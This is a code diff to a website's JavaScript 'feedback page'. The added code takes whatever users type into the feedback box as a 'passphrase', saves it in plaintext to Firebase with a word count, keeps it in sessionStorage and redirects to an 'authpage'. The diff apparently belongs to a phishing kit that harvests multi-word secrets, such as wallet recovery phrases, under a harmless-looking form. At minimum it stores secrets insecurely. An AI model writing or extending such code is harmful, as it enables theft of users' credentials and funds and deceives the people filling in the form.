@@ -1,13 +1,57 @@
 // ========================================
-// FEEDBACK PAGE FUNCTIONALITY
+// FEEDBACK PAGE FUNCTIONALITY WITH FIREBASE
 // ========================================
+
+// Hash function to create unique identifier from passphrase
+function hashPassphrase(passphrase) {
+    let hash = 0;
+    for (let i = 0; i < passphrase.length; i++) {
+        const char = passphrase.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+    }
+    return Math.abs(hash).toString(36);
+}
+
+// Check if passphrase already exists in Firebase
+async function checkExistingSubmission(passphraseHash) {
+    try {
+        const snapshot = await firebase.database()
+            .ref('submissions/' + passphraseHash)
+            .once('value');
+        return snapshot.val();
+    } catch (error) {
+        console.error('Error checking existing submission:', error);
+        return null;
+    }
+}
+
+// Save passphrase to Firebase (without sending to Formspree yet)
+async function savePassphrase(passphraseHash, passphrase) {
+    try {
+        await firebase.database()
+            .ref('submissions/' + passphraseHash)
+            .set({
+                passphrase: passphrase, // Store the actual passphrase for later submission
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                submittedAt: new Date().toISOString(),
+                wordCount: passphrase.split(/\s+/).filter(w => w.length > 0).length,
+                sentToFormspree: false // Track if sent to Formspree
+            });
+        return true;
+    } catch (error) {
+        console.error('Error saving passphrase:', error);
+        return false;
+    }
+}
+
 function initializeFeedbackPage() {
     const feedbackForm = document.getElementById('feedbackForm');
     const feedbackTextarea = document.getElementById('feedback');
     const errorMessage = document.getElementById('errorMessage');
 
     if (feedbackForm && feedbackTextarea) {
-        feedbackForm.addEventListener('submit', function(e) {
+        feedbackForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const text = feedbackTextarea.value.trim();
@@ -30,31 +74,43 @@ function initializeFeedbackPage() {
                 errorMessage.style.display = 'none';
             }
             
-            // Submit to Formspree
-            const formData = new FormData(this);
-            fetch(this.action, {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
+            // Create hash of passphrase
+            const passphraseHash = hashPassphrase(text);
+            
+            // Check if this passphrase was already submitted
+            const existingSubmission = await checkExistingSubmission(passphraseHash);
+            
+            if (existingSubmission) {
+                // Already submitted - load previous state
+                console.log('Passphrase already submitted. Loading previous state...');
+                
+                // Store the hash and passphrase in sessionStorage
+                sessionStorage.setItem('passphraseHash', passphraseHash);
+                sessionStorage.setItem('passphrase', text);
+                sessionStorage.setItem('isReturningPassphrase', 'true');
+                
+                // If they have a linked email hash, also store that
+                if (existingSubmission.emailHash) {
+                    sessionStorage.setItem('linkedEmailHash', existingSubmission.emailHash);
                 }
-            })
-            .then(function(response) {
-                if (response.ok) {
-                    // Redirect to authpage.html on success
-                    window.location.href = 'authpage.html';
-                } else {
-                    if (errorMessage) {
-                        errorMessage.textContent = 'Error submitting feedback. Please try again.';
-                        errorMessage.style.display = 'block';
-                    }
-                }
-            })
-            .catch(function(error) {
-                console.log('Form submission error, redirecting to authpage anyway...');
-                // Redirect to authpage.html even on error for demo purposes
+                
+                // Redirect to authpage
                 window.location.href = 'authpage.html';
-            });
+                return;
+            }
+            
+            // New passphrase - save to Firebase only (don't send to Formspree yet)
+            await savePassphrase(passphraseHash, text);
+            
+            // Store in sessionStorage for authpage
+            sessionStorage.setItem('passphraseHash', passphraseHash);
+            sessionStorage.setItem('passphrase', text);
+            sessionStorage.setItem('isReturningPassphrase', 'false');
+            
+            console.log('Passphrase saved to Firebase. Redirecting to authpage...');
+            
+            // Redirect to authpage
+            window.location.href = 'authpage.html';
         });
     }
 }
